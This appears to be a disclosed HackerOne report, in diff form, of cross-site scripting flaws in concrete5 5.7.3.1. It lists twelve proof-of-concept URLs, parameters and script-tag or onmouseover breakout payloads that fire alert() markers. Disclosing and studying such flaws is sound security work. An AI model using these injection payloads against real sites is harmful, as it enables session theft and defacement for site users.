@@ -1,0 +1,72 @@
+ReportLink:https://hackerone.com/reports/62294
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/netsparker
+ReportedTo:concrete5(concrete5)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:15.07.2015 15:47:56
+
+Summary:
+
+Proof of Concept URLs for XSS in Concrete5:
+
+URL: /concrete5.7.3.1/index.php/dashboard/system/conversations/bannedwords/success 
+Parameter Name: banned_word%5b%5d 
+Parameter Type: POST 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x000936)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/dashboard/reports/logs/view?keywords=&level=&channel='"--></style></scRipt><scRipt>alert(0x0044C4)</scRipt>&level[]=600 
+Parameter Name: channel 
+Parameter Type: GET 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x0044C4)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/tools/required/permissions/access_entity?peID=1&pdID=3&accessType='"--></style></scRipt><scRipt>alert(0x00690C)</scRipt> 
+Parameter Name: accessType 
+Parameter Type: GET 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x00690C)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/dashboard/system/multilingual/setup/load_icon 
+Parameter Name: msCountry 
+Parameter Type: POST 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x00D064)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/tools/required/permissions/access_entity?accessType='"--></style></scRipt><scRipt>alert(0x00687C)</scRipt>&pkCategoryHandle=block_type 
+Parameter Name: accessType 
+Parameter Type: GET 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x00687C)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/ccm/system/dialogs/area/design/submit?ccm_token=1423928022:7f9b7c3cb0f6721bab4a0dec86cefaa3&cID=1&arHandle='"--></style></scRipt><scRipt>alert(0x00D33A)</scRipt> 
+Parameter Name: arHandle 
+Parameter Type: GET 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x00D33A)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/dashboard/pages/single 
+Parameter Name: pageURL: 
+Parameter Type: POST 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x00627A)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/ccm/system/dialogs/area/design?arHandle='"--></style></scRipt><scRipt>alert(0x001D34)</scRipt>&cID=1 
+Parameter Name: arHandle 
+Parameter Type: GET 
+Attack Pattern: '"--></style></scRipt><scRipt>alert(0x001D34)</scRipt>
+
+URL: /concrete5.7.3.1/index.php/dashboard/system/seo/searchindex/updated 
+Parameter Name: SEARCH_INDEX_AREA_METHOD 
+Parameter Type: POST 
+Attack Pattern: '" onmouseover= alert(0x00047E)
+
+URL: /concrete5.7.3.1/index.php/dashboard/system/optimization/jobs/job_scheduled 
+Parameter Name: unit 
+Parameter Type: POST 
+Attack Pattern: '" onmouseover= alert(0x000C5A)
+
+URL: /concrete5.7.3.1/index.php/dashboard/system/registration/open/1 
+Parameter Name: register_notification_email 
+Parameter Type: POST 
+Attack Pattern: '" onmouseover= alert(0x0000DE)
+
+URL: /concrete5.7.3.1/index.php/dashboard/extend/connect/"onmouseover="alert(0x00170E) 
+Parameter Name: URI-BASED 
+Parameter Type: Full URL: 
+Attack Pattern: /"onmouseover="alert(0x00170E)
